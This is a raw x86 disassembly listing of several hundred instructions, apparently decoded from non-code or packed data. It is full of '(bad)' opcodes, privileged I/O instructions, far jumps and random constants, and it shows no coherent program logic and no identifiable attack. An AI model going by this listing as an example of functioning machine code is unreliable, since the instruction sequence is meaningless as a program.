  409c97:	aam    0x7c
  409c99:	mov    bh,0x66
  409c9b:	ret    0xee96
  409c9e:	jns    0x409ce3
  409ca0:	and    al,BYTE PTR [ecx]
  409ca2:	pop    ebp
  409ca3:	sbb    edi,DWORD PTR [esi+0x4f]
  409ca6:	call   0xad248a6c
  409cab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cac:	dec    ebx
  409cad:	or     BYTE PTR [esi],dl
  409caf:	test   al,0xb7
  409cb1:	pusha  
  409cb2:	test   BYTE PTR [eax-0x6e],cl
  409cb5:	push   es
  409cb6:	pop    edx
  409cb7:	mov    ebp,0xfd7033cd
  409cbc:	lds    esp,FWORD PTR [eax-0x55]
  409cbf:	inc    eax
  409cc0:	cmp    DWORD PTR ds:0xc5a5eab0,0xdd9ec22d
  409cca:	sbb    eax,0xb6e46050
  409ccf:	pushf  
  409cd0:	mov    ds:0x9bb92e88,eax
  409cd5:	jb     0x409c7d
  409cd7:	xchg   ebx,eax
  409cd8:	stos   DWORD PTR es:[edi],eax
  409cd9:	in     eax,0xea
  409cdb:	xchg   edi,eax
  409cdc:	fnstenv [ecx]
  409cde:	and    eax,0xfb51cdb2
  409ce3:	mov    ?,edx
  409ce5:	xchg   edi,eax
  409ce6:	leave  
  409ce7:	jne    0x409c93
  409ce9:	mov    dh,0x43
  409ceb:	inc    ebx
  409cec:	arpl   WORD PTR [ebp+0x6b82495c],bx
  409cf2:	xchg   esi,eax
  409cf3:	or     eax,0x8bdcc9d4
  409cf8:	sahf   
  409cf9:	jle    0x409d3d
  409cfb:	test   DWORD PTR [eax+0x4016dc6c],esp
  409d01:	shr    BYTE PTR [ebx*8-0x6dd324de],0xbc
  409d09:	ret    
  409d0a:	fcmovne st,st(3)
  409d0c:	mov    ds:0x364ebe82,al
  409d11:	jbe    0x409d67
  409d13:	mov    esi,0x4bf119f1
  409d18:	iret   
  409d19:	retf   0x7449
  409d1c:	jbe    0x409caf
  409d1e:	jnp    0x409d30
  409d20:	into   
  409d21:	adc    al,0x48
  409d23:	ja     0x409ca9
  409d25:	jo     0x409ce1
  409d27:	dec    ebp
  409d28:	repnz repz aad 0x86
  409d2c:	aam    0x7
  409d2e:	inc    edi
  409d2f:	iret   
  409d30:	or     eax,DWORD PTR ds:0xa7f8669d
  409d36:	in     eax,dx
  409d37:	pop    esp
  409d38:	sub    DWORD PTR [ebp-0x70f335b3],eax
  409d3e:	sub    eax,0xfa87eb70
  409d43:	adc    ebp,DWORD PTR [ebp+0x379347f8]
  409d49:	cdq    
  409d4a:	imul   ebp,DWORD PTR [eax-0x4b6ddf3e],0xffffffc8
  409d51:	ja     0x409dbd
  409d53:	shl    BYTE PTR ds:0x78603aea,1
  409d59:	pusha  
  409d5a:	lds    edx,FWORD PTR [edi-0x2a02c6ac]
  409d60:	test   al,0x1f
  409d62:	add    al,0x39
  409d64:	and    al,0x3
  409d66:	fadd   QWORD PTR [eax+0x70]
  409d69:	sub    DWORD PTR [ebx],0xe4207878
  409d6f:	popf   
  409d70:	sbb    BYTE PTR [ecx],ch
  409d72:	push   cs
  409d73:	pop    ds
  409d74:	add    eax,0x1b192f8c
  409d79:	enter  0xd393,0xce
  409d7d:	das    
  409d7e:	arpl   WORD PTR ds:0x6eddccc2,bx
  409d84:	out    0x0,al
  409d86:	ret    0xf2d8
  409d89:	cmc    
  409d8a:	call   0xcbc4:0x48219fca
  409d91:	cs pop edi
  409d93:	pop    ecx
  409d94:	gs mov bl,0x2e
  409d97:	inc    edx
  409d98:	cmc    
  409d99:	repnz rcr DWORD PTR [edx+ecx*2],1
  409d9d:	in     al,0xc
  409d9f:	call   0x6c8d1a4b
  409da4:	pop    ss
  409da5:	xor    cl,BYTE PTR ss:[ecx-0x73]
  409da9:	ret    0x9d4e
  409dac:	aas    
  409dad:	inc    esi
  409dae:	dec    ebx
  409daf:	mov    eax,0xec887a55
  409db4:	xchg   ebx,eax
  409db5:	dec    eax
  409db6:	leave  
  409db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409db8:	das    
  409db9:	mov    edi,0x104e7c60
  409dbe:	mov    esp,0x5d86fb42
  409dc3:	jo     0x409dcc
  409dc5:	mov    cl,0x96
  409dc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dc8:	xor    esp,DWORD PTR es:[edi-0x29]
  409dcc:	xchg   edi,eax
  409dcd:	pushf  
  409dce:	lods   al,BYTE PTR es:[esi]
  409dd0:	js     0x409e31
  409dd2:	or     edx,DWORD PTR [ebx+0x99d2b01]
  409dd8:	sbb    BYTE PTR ds:0x9c93b5f9,ah
  409dde:	mov    al,ds:0xe7f0bdf
  409de3:	or     al,BYTE PTR [edx]
  409de5:	mov    ah,0x50
  409de7:	retf   
  409de8:	xchg   edi,eax
  409de9:	xor    eax,0x68f9f96d
  409dee:	cmp    ebx,DWORD PTR ds:0x62e78f46
  409df4:	mov    ebx,0x7e09cedf
  409df9:	mov    ch,0xfe
  409dfb:	lods   al,BYTE PTR ds:[esi]
  409dfc:	mov    esi,0xb722f37d
  409e01:	repz mov cl,0xa8
  409e04:	mov    ds:0x6fb34819,al
  409e09:	sbb    cl,BYTE PTR [ebx+edx*1]
  409e0c:	push   ds
  409e0d:	jmp    0x409d95
  409e0f:	lds    esp,FWORD PTR [esi-0x61]
  409e12:	ss mov eax,0x51d90a73
  409e18:	mov    eax,0x57163d45
  409e1d:	icebp  
  409e1e:	jp     0x409e56
  409e20:	pop    esp
  409e21:	jbe    0x409e84
  409e23:	hlt    
  409e24:	inc    BYTE PTR [eax]
  409e26:	jmp    0xd68a84bc
  409e2b:	scas   al,BYTE PTR es:[edi]
  409e2c:	(bad)  
  409e2e:	sub    al,BYTE PTR [eax]
  409e30:	jge    0x409dbd
  409e32:	and    BYTE PTR [ebx-0x1e0152b2],bl
  409e38:	xchg   esp,eax
  409e39:	out    0x8b,eax
  409e3b:	and    DWORD PTR [ebx-0x221d6196],ebp
  409e41:	jp     0x409e01
  409e43:	mov    eax,ds:0xfc5121a6
  409e48:	add    eax,0xb2124f82
  409e4d:	xchg   edx,eax
  409e4e:	ror    ecx,0xd
  409e51:	push   eax
  409e52:	xchg   edi,eax
  409e53:	aaa    
  409e54:	mov    cl,0x53
  409e56:	mov    al,ds:0x3eb6b884
  409e5b:	int    0x79
  409e5d:	jmp    0x409ecf
  409e5f:	ins    BYTE PTR es:[edi],dx
  409e60:	sar    DWORD PTR [ecx-0x58],cl
  409e63:	pop    edi
  409e64:	jl     0x409e6b
  409e66:	cmp    al,0x33
  409e68:	or     BYTE PTR [edi+0xaf0e104],dl
  409e6e:	aam    0x47
  409e70:	jp     0x409e39
  409e72:	into   
  409e73:	aam    0xd1
  409e75:	adc    eax,ecx
  409e77:	adc    BYTE PTR [esp+ecx*1+0x6cd191a1],ah
  409e7e:	in     eax,0xa1
  409e80:	pop    ss
  409e81:	pop    edx
  409e82:	je     0x409ecc
  409e84:	jo     0x409ed3
  409e86:	(bad)  
  409e87:	call   0x7fa68b6c
  409e8c:	xchg   ebx,eax
  409e8d:	jae    0x409eb4
  409e8f:	xor    eax,0x1313ec0c
  409e94:	les    esp,FWORD PTR ds:0x4c4b52ed
  409e9a:	mov    ss,WORD PTR [ebx-0x76c416c0]
  409ea0:	inc    eax
  409ea1:	(bad)  
  409ea2:	fiadd  WORD PTR [ebx-0x12fd91d0]
  409ea8:	in     al,dx
  409ea9:	popa   
  409eaa:	inc    ebx
  409eab:	dec    ebp
  409eac:	pusha  
  409ead:	push   es
  409eae:	inc    eax
  409eaf:	add    dh,ch
  409eb1:	mov    esp,0x1cbe60d5
  409eb6:	es jnp 0x409ecd
  409eb9:	out    0x63,eax
  409ebb:	call   0xc03124e1
  409ec0:	push   esi
  409ec1:	mov    edi,0x6e52317b
  409ec6:	int    0x10
  409ec8:	mul    DWORD PTR [ebx+0x21]
  409ecb:	and    eax,DWORD PTR [edx]
  409ecd:	test   DWORD PTR [ecx+0x26],ebp
  409ed0:	lahf   
  409ed1:	add    cl,al
  409ed3:	push   esi
  409ed4:	dec    esi
  409ed5:	mov    esi,0x5e89ada4
  409eda:	cmp    DWORD PTR [ecx],ebx
  409edc:	xchg   esi,eax
  409edd:	sbb    al,0x52
  409edf:	cmc    
  409ee0:	retfw  
  409ee2:	sahf   
  409ee3:	sub    DWORD PTR [edi],ebp
  409ee5:	fdiv   DWORD PTR [ebx]
  409ee7:	push   es
  409ee8:	cmp    al,0xd3
  409eea:	push   ds
  409eeb:	fst    QWORD PTR [ebx+0x1]
  409eee:	call   0xf21b7f71
  409ef3:	les    edx,FWORD PTR [edi]
  409ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ef6:	leave  
  409ef7:	inc    esp
  409ef8:	push   esp
  409ef9:	es or  ebp,0x4d
  409efd:	test   BYTE PTR [ecx+0x471475a],ch
  409f03:	dec    esi
  409f04:	push   0x11a57626
  409f09:	inc    esi
  409f0a:	xchg   BYTE PTR [esi+0x7a3fac8c],al
  409f10:	sbb    al,cl
  409f12:	dec    esp
  409f13:	mov    esi,eax
  409f15:	mov    bl,0x17
  409f17:	shl    ch,1
  409f19:	enter  0x9594,0x37
  409f1d:	push   ebx
  409f1e:	sub    BYTE PTR [esi+0x3547b809],cl
  409f24:	pop    ss
  409f25:	pop    edx
  409f26:	frndint 
  409f28:	mov    cl,0x65
  409f2a:	dec    eax
  409f2b:	fcom   st(4)
  409f2d:	and    eax,0x7b0ea170
  409f32:	push   0x6d
  409f34:	test   edx,eax
  409f36:	sub    eax,0x6d24f3f3
  409f3b:	retf   
  409f3c:	fmul   QWORD PTR [edx+edx*4-0x68ebb040]
  409f43:	dec    edx
  409f44:	pop    esp
  409f45:	add    BYTE PTR [ecx],dl
  409f47:	xchg   edi,eax
  409f48:	lods   al,BYTE PTR ds:[esi]
  409f49:	push   0xfffffff7
  409f4b:	dec    ebp
  409f4c:	lds    esi,FWORD PTR ds:0xd0bc5d01
  409f52:	inc    esi
  409f53:	mov    eax,ds:0x4db4d519
  409f58:	lahf   
  409f59:	dec    edx
  409f5a:	push   esi
  409f5b:	je     0x409fd5
  409f5d:	sbb    eax,0x20ef0a56
  409f62:	mov    ds:0x3af8112a,al
  409f67:	push   ebx
  409f68:	xchg   ecx,eax
  409f69:	inc    eax
  409f6a:	inc    esp
  409f6b:	iret   
  409f6c:	push   ss
  409f6d:	cmp    esp,ebx
  409f6f:	xchg   DWORD PTR [ecx],eax
  409f71:	and    al,0xa8
  409f73:	arpl   WORD PTR [ebx-0x35de7ed1],cx
  409f79:	sahf   
  409f7a:	and    ebp,DWORD PTR [edi+ecx*2-0x6b]
  409f7e:	fldenv [edi+esi*2+0x58]
  409f82:	lea    esp,[ecx-0x45]
  409f85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f86:	int    0x85
  409f88:	dec    ebp
  409f89:	mov    fs,WORD PTR ds:0xcf5afc03
  409f8f:	stos   DWORD PTR es:[edi],eax
  409f90:	or     bh,BYTE PTR [edx]
  409f92:	cs adc bl,al
  409f95:	sti    
  409f96:	imul   eax,DWORD PTR [edx+0x1e],0x1ea70c43
  409f9d:	dec    BYTE PTR [ebx]
  409f9f:	lahf   
  409fa0:	(bad)
  409fa3:	mov    ebx,DWORD PTR [ebx+0xae6caa1]
  409fa9:	shl    esp,cl
  409fab:	xchg   ebx,eax
  409fac:	popf   
  409fad:	inc    ecx
  409fae:	daa    
  409faf:	mov    DWORD PTR [eax+0x7f],edx
  409fb2:	test   eax,0x960cb4ad
  409fb7:	xchg   ebp,esp
  409fb9:	jae    0x40a007
  409fbb:	xchg   esi,eax
  409fbc:	mov    edi,0xa66bdb3c
  409fc1:	inc    ebp
  409fc2:	mov    bl,0xd5
  409fc4:	jno    0x40a023
  409fc6:	cmp    eax,esp
  409fc8:	cmp    DWORD PTR [ebx-0x16020e8c],eax
  409fce:	aam    0x2b
  409fd0:	sub    eax,edi
  409fd2:	inc    edx
  409fd3:	test   al,0xd4
  409fd5:	in     eax,0x7c
  409fd7:	jecxz  0x409f5e
  409fd9:	leave  
  409fda:	inc    eax
  409fdb:	arpl   WORD PTR [esp+ebp*2],si
  409fde:	lds    eax,FWORD PTR [ebp+0x70]
  409fe1:	(bad)  
  409fe3:	sahf   
  409fe4:	mov    al,0x12
  409fe6:	mov    ch,0xfa
  409fe8:	sub    BYTE PTR [edi],ah
  409fea:	scas   al,BYTE PTR es:[edi]
  409feb:	xchg   ebp,eax
  409fec:	fdivr  QWORD PTR [edi+eiz*4-0x34]
  409ff0:	dec    esi
  409ff1:	xor    BYTE PTR [esi+ecx*1-0x49],ch
  409ff5:	sub    DWORD PTR [esi],0x22
  409ff8:	push   0x9d338bea
  409ffd:	loope  0x409fe1
  409fff:	cmp    DWORD PTR ds:0xf81b32b5,edx
  40a005:	jmp    0xd43a:0xd9ae9b4f
  40a00c:	pushf  
  40a00d:	dec    eax
  40a00e:	mov    esi,edx
  40a010:	mov    al,0xf3
  40a012:	out    0x46,eax
  40a014:	push   ebp
  40a015:	scas   al,BYTE PTR es:[edi]
  40a016:	int    0x52
  40a018:	push   es
  40a019:	or     BYTE PTR [ecx+esi*8+0x27d09820],al
  40a020:	imul   edx,DWORD PTR [esi],0x1b120dfc
  40a026:	test   BYTE PTR [edi+0x540f3c6b],0x2
  40a02d:	lods   eax,DWORD PTR ds:[esi]
  40a02e:	dec    esp
  40a02f:	xchg   edi,eax
  40a030:	loop   0x40a02a
  40a032:	push   0xffffffbf
  40a034:	mov    edi,0x748e82cb
  40a039:	cmp    al,0x81
  40a03b:	xchg   ecx,eax
  40a03c:	jbe    0x40a0b6
  40a03e:	(bad)  
  40a03f:	in     al,dx
  40a040:	jbe    0x40a048
  40a042:	outs   dx,BYTE PTR ds:[esi]
  40a043:	(bad)  [edi]
  40a045:	sub    BYTE PTR [edi],ch
  40a047:	adc    BYTE PTR [edx+0x70],al
  40a04a:	ins    BYTE PTR es:[edi],dx
  40a04b:	mul    BYTE PTR [bx+si]
  40a04e:	pop    ebp
  40a04f:	mov    ah,0x3c
  40a051:	xchg   ecx,eax
  40a052:	imul   ebp,DWORD PTR [ebp+0x32831b77],0x12
  40a059:	(bad)  
  40a05a:	call   0x109e:0xce1c866
  40a061:	push   eax
  40a062:	(bad)  
  40a063:	ds add al,0x36
  40a066:	jo     0x40a07b
  40a068:	add    esp,edi
  40a06a:	mov    BYTE PTR [esi],ah
  40a06c:	dec    ebp
  40a06d:	sar    BYTE PTR [ebx+0x42],cl
  40a070:	fbld   TBYTE PTR [ebp-0x43]
  40a073:	mov    esi,0xe83d1f7c
  40a078:	mov    eax,ds:0xd862b621
  40a07d:	dec    esi
  40a07e:	jmp    0x40a0af
  40a080:	sub    al,0x2b
  40a082:	dec    edx
  40a083:	jl     0x40a092
  40a085:	lods   eax,DWORD PTR ds:[esi]
  40a086:	push   ss
  40a087:	rcl    DWORD PTR [ebx],0x29
  40a08a:	add    esp,DWORD PTR [ebp+ebx*8+0x67]
  40a08e:	push   ss
  40a08f:	jb     0x40a0cb
  40a091:	loopne 0x40a092
  40a093:	jmp    FWORD PTR [eax+ebx*1]
  40a096:	in     al,dx
  40a097:	push   eax
  40a098:	sbb    BYTE PTR [esi-0x5dfd5847],dh
  40a09e:	sbb    DWORD PTR [ebx],ebp
  40a0a0:	xor    DWORD PTR [edi+0x15],esi
  40a0a3:	inc    edi
  40a0a4:	cwde   
  40a0a5:	or     esi,DWORD PTR [ecx]
  40a0a7:	adc    DWORD PTR [edx-0x64ab72e8],0xfffffff6
  40a0ae:	xchg   ebx,eax
  40a0af:	shl    eax,cl
  40a0b1:	push   es
  40a0b2:	pop    esi
  40a0b3:	shl    BYTE PTR [ebx],cl
  40a0b5:	xchg   DWORD PTR [ecx],edi
  40a0b7:	push   esi
  40a0b8:	loopne 0x40a070
  40a0ba:	dec    ecx
  40a0bb:	pop    esp
  40a0bc:	push   edi
  40a0bd:	cs stc 
  40a0bf:	(bad)  
  40a0c0:	xor    DWORD PTR [ecx],ebx
  40a0c2:	mov    al,0x51
  40a0c4:	jg     0x40a13f
  40a0c6:	pop    ss
  40a0c7:	sahf   
  40a0c8:	in     al,0xb1
  40a0ca:	xor    al,0xf2
  40a0cc:	loop   0x40a0cf
  40a0ce:	imul   edi,DWORD PTR [edx+ebp*8-0x261ac734],0x17
  40a0d6:	das    
  40a0d7:	push   esp
  40a0d8:	jge    0x40a110
  40a0da:	in     al,dx
  40a0db:	fadd   QWORD PTR [edx+0x67]
  40a0de:	and    BYTE PTR [esi-0x58],ah
  40a0e1:	inc    edx
  40a0e2:	cdq    
  40a0e3:	(bad)  
  40a0e4:	(bad)  
  40a0e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0e6:	sub    al,0xcf
  40a0e8:	sbb    eax,0xfe417b43
  40a0ed:	aaa    
  40a0ee:	xchg   ecx,eax
  40a0ef:	jmp    0x40a15a
  40a0f1:	pslld  mm3,QWORD PTR [eax+0x43]
  40a0f5:	xchg   edx,eax
  40a0f6:	fsubr  DWORD PTR [ebp+0x1d]
  40a0f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0fa:	or     eax,0x80f047cb
  40a0ff:	sbb    BYTE PTR [edi+0x190125b2],bh
  40a105:	les    edi,FWORD PTR [eax]
  40a107:	jo     0x40a115
  40a109:	fdiv   QWORD PTR [ebx*8-0x52388c07]
  40a110:	inc    edi
  40a111:	mov    ebp,0xa0f3d14b
  40a116:	mov    esp,0xf863808b
  40a11b:	push   0x378ad5ea
  40a120:	int    0x3e
  40a122:	dec    ebx
  40a123:	push   esp
  40a124:	aam    0x5c
  40a126:	jl     0x40a0d6
  40a128:	out    dx,eax
  40a129:	adc    dh,BYTE PTR [eax+0x3f]
  40a12c:	ins    BYTE PTR es:[edi],dx
  40a12d:	adc    ebx,DWORD PTR [esi+ebp*8-0x5c]
  40a131:	lds    esi,FWORD PTR ds:0x9ace3a9a
  40a137:	pop    ss
  40a138:	ret    0xa569
  40a13b:	xchg   ecx,eax
  40a13c:	inc    ebx
  40a13d:	or     BYTE PTR [edx],ch
  40a13f:	into   
  40a140:	sar    ebp,1
  40a142:	jmp    0x1aee7ef3
  40a147:	cwde   
  40a148:	sahf   
  40a149:	jae    0x40a1ac
  40a14b:	adc    eax,0xe48a3cfa
  40a150:	rcr    BYTE PTR [ebx+0x7e2cb7d0],0xe7
  40a157:	inc    esp
  40a158:	add    BYTE PTR fs:[edx-0x37],ah
  40a15c:	mov    esp,0x61fe6cd4
  40a161:	out    dx,al
  40a162:	mov    bl,0x7a
  40a164:	popf   
  40a165:	xlat   BYTE PTR ds:[ebx]
  40a166:	imul   ebp,DWORD PTR [edi-0x7a],0x5756068b
  40a16d:	fidiv  WORD PTR [esi]
  40a16f:	(bad)  
  40a170:	sub    al,ch
  40a172:	rol    DWORD PTR [ecx+0x79],cl
  40a175:	(bad)  
  40a176:	(bad)  
  40a177:	cmp    al,0x3a
  40a179:	jge    0x40a19a
  40a17b:	sub    al,BYTE PTR [edx+ebx*2+0x5e1e8290]
  40a182:	add    DWORD PTR [ebx-0x1c],eax
  40a185:	retf   0x7139
  40a188:	pop    eax
  40a189:	test   DWORD PTR [ebx],esp
  40a18b:	inc    eax
  40a18c:	loopne 0x40a1d8
  40a18e:	sbb    al,0x38
  40a190:	xor    BYTE PTR [ebx-0x23],cl
  40a193:	sub    BYTE PTR [esi+0x7d816bc8],ch
  40a199:	std    
  40a19a:	enter  0x9e8a,0x19
  40a19e:	push   ds
  40a19f:	mov    ch,0xc5
  40a1a1:	mov    bh,0x6b
  40a1a3:	push   ds
  40a1a4:	faddp  st(3),st
  40a1a6:	and    eax,0x1ee25361
  40a1ab:	lock loop 0x40a1eb
  40a1ae:	vmread DWORD PTR ds:0x2d7cf7a,ecx
  40a1b5:	jns    0x40a200
  40a1b7:	jecxz  0x40a1f6
  40a1b9:	clc    
  40a1ba:	inc    ecx
  40a1bb:	pop    esi
  40a1bc:	mov    ds,WORD PTR [ebx-0x7a]
  40a1bf:	rcl    BYTE PTR [ebx],0x51
  40a1c2:	in     al,0x11
  40a1c4:	popa   
  40a1c5:	pop    edi
  40a1c6:	dec    ebx
  40a1c7:	test   al,0xcc
  40a1c9:	hlt    
  40a1ca:	es clc 
  40a1cc:	je     0x40a1f1
  40a1ce:	mov    ah,0xd7
  40a1d0:	sbb    eax,ebx
  40a1d2:	nop
  40a1d3:	mov    bh,0x6e
  40a1d5:	sbb    BYTE PTR [ecx+0x1414c72],bh
  40a1db:	jge    0x40a218
  40a1dd:	gs test eax,0x2f76a735
  40a1e3:	out    0xb1,eax
  40a1e5:	fcos   
  40a1e7:	in     al,dx
  40a1e8:	inc    esp
  40a1e9:	daa    
  40a1ea:	jp     0x40a1d4
  40a1ec:	stc    
  40a1ed:	and    edx,edi
  40a1ef:	sub    BYTE PTR [ebx+0x664828a0],ch
  40a1f5:	adc    edi,DWORD PTR [ecx+0x10]
  40a1f8:	mov    edx,0x590e8c86
  40a1fd:	adc    DWORD PTR [eax],ebx
  40a1ff:	fild   QWORD PTR [eax+ecx*2-0x9f20c8d]
  40a206:	(bad)  
  40a207:	push   ecx
  40a208:	mov    edi,0x71baa452
  40a20d:	sub    dh,BYTE PTR [edi+ebx*8-0x1]
  40a211:	inc    ecx
  40a212:	aas    
  40a213:	add    eax,0x6904ac00
  40a218:	cmp    bh,cl
  40a21a:	inc    eax
  40a21b:	popa   
  40a21c:	jae    0x40a1df
  40a21e:	dec    edx
  40a21f:	mov    al,ss:0x1c093caa
  40a225:	xor    dh,BYTE PTR [ebp-0x23]
  40a228:	and    bl,dl
  40a22a:	jb     0x40a2aa
  40a22c:	sbb    eax,esp
  40a22e:	or     al,0x49
  40a230:	aam    0xaa
  40a232:	pop    esi
  40a233:	mov    cl,al
  40a235:	test   BYTE PTR [ecx],bh
  40a237:	push   esi
  40a238:	and    ecx,DWORD PTR [esp+esi*1+0x6faeecff]
  40a23f:	in     al,0x1f
  40a241:	loopne 0x40a2b7
  40a243:	int    0x7e
  40a245:	mov    ebx,0xf42c8aa1
  40a24a:	inc    eax
  40a24b:	sub    al,BYTE PTR [edx+0x3f2db8a3]
  40a251:	adc    cl,BYTE PTR [edx-0x7f]
  40a254:	inc    ebx
  40a255:	adc    DWORD PTR [eax],edi
  40a257:	adc    al,0x85
  40a259:	xchg   edx,eax
  40a25a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a25b:	lahf   
  40a25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a25d:	xchg   ecx,eax
  40a25e:	inc    edx
  40a25f:	(bad)  
  40a260:	sbb    esp,esp
  40a262:	xor    eax,edi
  40a264:	xchg   BYTE PTR [edi+esi*1+0x300da3e0],ah
  40a26b:	adc    DWORD PTR [ecx],ebx
  40a26d:	and    eax,DWORD PTR [ebp-0x5e]
  40a270:	fbstp  TBYTE PTR [ebp+0x5e]
  40a273:	mov    ebx,0x8892e6f2
  40a278:	into   
  40a279:	(bad)  
  40a27a:	mov    WORD PTR [ebp+0x3caad6de],?
  40a280:	call   0x479b:0xedc14cba
  40a287:	cmp    DWORD PTR [esi],edi
  40a289:	enter  0xece4,0xe
  40a28d:	int3   
  40a28e:	shl    BYTE PTR [eax+edx*4],cl
  40a291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a292:	xor    al,0xa6
  40a294:	(bad)  
  40a295:	call   0x38d558f4
  40a29a:	mov    ecx,0x18edfa62
  40a29f:	and    al,0xaf
  40a2a1:	or     eax,0xd28ea4cf
  40a2a6:	std    
  40a2a7:	add    eax,eax
  40a2a9:	int3   
  40a2aa:	push   ebp
  40a2ab:	cmp    cl,dl
  40a2ad:	jno    0x40a2d9
  40a2af:	and    edx,eax
  40a2b1:	inc    ebx
  40a2b2:	sub    al,0xc
  40a2b4:	cli    
  40a2b5:	xchg   esi,eax
  40a2b6:	xchg   edi,eax
  40a2b7:	rcl    DWORD PTR ds:0x60f0033b,cl
  40a2bd:	xchg   edi,eax
  40a2be:	in     al,0x6f
  40a2c0:	(bad)  
  40a2c2:	cmp    esp,edi
  40a2c4:	ret    
  40a2c5:	xchg   edx,ebx
  40a2c7:	adc    al,0x8a
  40a2c9:	sub    ch,BYTE PTR [eax]
  40a2cb:	(bad)  
  40a2cc:	ficom  WORD PTR [ebx-0x5bd456d2]
  40a2d2:	xchg   edx,edx
  40a2d4:	nop
  40a2d5:	(bad)  
  40a2d7:	shl    BYTE PTR [esi+ebx*8-0x5efcd743],0x41
  40a2df:	test   eax,0xf2add954
  40a2e4:	pop    ss
  40a2e5:	fisubr DWORD PTR [edx]
  40a2e7:	xchg   esi,eax
  40a2e8:	pop    ecx
  40a2e9:	mov    fs,WORD PTR [edi+0x3f]
  40a2ec:	mov    BYTE PTR [esi-0x1],bl
  40a2ef:	loope  0x40a349
  40a2f1:	jmp    DWORD PTR [ebp+0x79b93841]
  40a2f7:	(bad)  
  40a2f8:	xor    DWORD PTR [ebx+0x52],ecx
  40a2fb:	or     ah,ch
  40a2fd:	jae    0x40a2f6
  40a2ff:	sub    al,0x88
  40a301:	fdiv   DWORD PTR [ecx+0x31f7194c]
  40a307:	call   0xee56:0x234739ed
  40a30e:	cmp    eax,DWORD PTR [ecx+0x5a]
  40a311:	dec    esp
  40a312:	or     ebx,DWORD PTR [eax-0x2a]
  40a315:	sub    esi,DWORD PTR [edx+0x21]
  40a318:	jp     0x40a328
  40a31a:	add    eax,0xd2f5bfed
  40a31f:	xchg   BYTE PTR [ebp+0x1921d413],dh
  40a325:	mov    bl,0xe3
  40a327:	inc    edx
  40a328:	xor    DWORD PTR [ecx-0x70],eax
  40a32b:	jle    0x40a2dc
  40a32d:	cmp    al,0x1
  40a32f:	or     ebx,ebp
  40a331:	or     esp,0x8fdbb87d
  40a337:	push   esi
  40a338:	sahf   
  40a339:	call   0x87c6:0xe055cab4
  40a340:	dec    ecx
  40a341:	loop   0x40a358
  40a343:	sub    DWORD PTR [ebp-0x327bee99],esp
  40a349:	push   cs
  40a34a:	fsubr  QWORD PTR [esi+eiz*1+0x3941db0]
  40a351:	lea    edx,[ecx]
  40a353:	pop    eax
  40a354:	mov    ebp,0x17258abd
  40a359:	(bad)  
  40a35a:	stc    
  40a35b:	xchg   ebx,eax
  40a35c:	stos   DWORD PTR es:[edi],eax
  40a35d:	lahf   
  40a35e:	push   esp
  40a35f:	inc    ebx
  40a360:	(bad)  
  40a361:	pop    es
  40a362:	jmp    0x40a39d
  40a364:	mov    esi,0x9d6cbc85
  40a369:	aad    0xce
  40a36b:	jl     0x40a364
  40a36d:	mov    ecx,ecx
  40a36f:	mov    eax,ds:0x665a2ec3
  40a374:	shr    cl,0x2
  40a377:	adc    DWORD PTR [ebp-0x4a],edx
  40a37a:	and    ebp,DWORD PTR [ecx+0x71]
  40a37d:	add    BYTE PTR [ecx+0x3c],bl
  40a380:	lds    edi,FWORD PTR [esi]
  40a382:	aas    
  40a383:	outs   dx,DWORD PTR ds:[esi]
  40a384:	or     DWORD PTR [eax-0x34],esp
  40a387:	mov    al,0x26
  40a389:	test   eax,0xb420cd04
  40a38e:	cmp    eax,0x57fd8eeb
  40a393:	pop    esi
  40a394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a395:	js     0x40a333
  40a397:	xor    ebx,DWORD PTR [ecx-0x38d9c576]
  40a39d:	xor    BYTE PTR [edi],dh
  40a39f:	(bad)  
  40a3a2:	lea    esi,[edx]
  40a3a4:	scas   al,BYTE PTR es:[edi]
  40a3a5:	mov    bh,0x1d
  40a3a7:	lds    ecx,FWORD PTR [ecx-0x5212285a]
  40a3ad:	cli    
  40a3ae:	aad    0x86
  40a3b0:	pop    ebp
  40a3b1:	dec    eax
  40a3b2:	popf   
  40a3b3:	(bad)  
  40a3b4:	lahf   
  40a3b5:	fidivr WORD PTR [edx-0x70f461c1]
  40a3bb:	adc    al,0x97
  40a3bd:	repnz repz fsubr QWORD PTR [bp+di]
  40a3c2:	(bad)  
  40a3c3:	jmp    0x40a3c6
  40a3c5:	sub    al,0xa5
  40a3c7:	xchg   ebx,eax
  40a3c8:	xchg   ebx,eax
  40a3c9:	in     eax,dx
  40a3ca:	fist   WORD PTR [esi]
  40a3cc:	xchg   edx,eax
  40a3cd:	stc    
  40a3ce:	sub    DWORD PTR [esp+eiz*4+0x71],esp
  40a3d2:	repz mov bh,0xf2
  40a3d5:	into   
  40a3d6:	js     0x40a3b5
  40a3d8:	xor    al,0x24
  40a3da:	(bad)  [ecx+0x26]
  40a3dd:	cmp    DWORD PTR [esi],esp
  40a3df:	xor    esi,DWORD PTR ds:[esi-0x16b0782a]
  40a3e6:	jo     0x40a3a3
  40a3e8:	std    
  40a3e9:	mov    edi,0x1c44f439
  40a3ee:	mov    ss,WORD PTR [edi-0x6e1f6be8]
  40a3f4:	dec    esi
  40a3f5:	dec    esi
  40a3f6:	(bad)  
  40a3f7:	clc    
  40a3f8:	(bad)  
  40a3f9:	stos   DWORD PTR es:[edi],eax
  40a3fa:	jmp    0x40a450
  40a3fc:	push   eax
  40a3fd:	test   edi,ebp
  40a3ff:	rcr    DWORD PTR [edi],cl
  40a401:	cmp    BYTE PTR [ebp-0x282cff96],0xc1
  40a408:	ins    BYTE PTR es:[edi],dx
  40a409:	fistp  QWORD PTR [edi-0x4d]
  40a40c:	and    eax,0x8f17af6d
  40a411:	sbb    eax,0x1e114ec9
  40a416:	loopne 0x40a3db
  40a418:	or     DWORD PTR [edx-0x37],eax
  40a41b:	inc    edi
  40a41c:	and    eax,0x8b06d20c
  40a421:	jmp    0x99ab:0xc8b54a6d
  40a428:	xor    edx,0xffffffde
